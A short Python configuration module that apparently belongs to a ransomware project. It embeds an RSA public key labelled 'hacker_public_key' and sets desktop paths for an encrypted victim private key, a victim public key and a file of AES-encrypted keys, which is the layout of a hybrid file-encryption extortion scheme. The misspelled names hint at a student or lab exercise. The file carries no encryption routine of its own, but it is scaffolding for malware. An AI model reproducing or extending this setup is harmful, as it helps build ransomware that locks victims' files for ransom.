import os

import enviourment

hacker_public_key = """-----BEGIN PUBLIC KEY-----
MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAxgbC8LJe10BQ8qRexdLb
T+q8cnoR3WVwZOKMt0DtmLjMAHgcLqwPHTkq6oZvihxH8lGmo7uxabyELXK76NBt
vvLBq0Cb+TRrkb/LNt8LSsQIl1JIysIJujyaJlHzo1OLjANaZMWj38OohTBB7C8X
xDnyRH3+E4fXHfTdNmLHBA3SYtb82o150et5YLxdpmVr3wRmgwfbUxD0V+kWETbh
yXmWInRjP8zkhCKXmxkD8NFMsIvE2YlcJVqHA2RYA0CGL2jSoi+Gcet9h5i1DgFa
HHs+GHCDgXmcKi6ltj8r3/lEdeHCDGc1cfn8oSeokRHNplc8YdNWg+OYzbb0T4J6
6wIDAQAB
-----END PUBLIC KEY-----"""

local_root = '\\Local_root'
test_enviournment_path = os.getcwd() + local_root
encrypted_client_private_key_path = os.path.join(enviourment.get_desktop_path(), 'YourEncrypted_Private_key.key')
client_public_key_path = os.path.join(enviourment.get_desktop_path(), 'YourPublic_key.PEM')
aes_encrypted_keys_path = os.path.join(enviourment.get_desktop_path(), "AES_encrypted_keys.txt")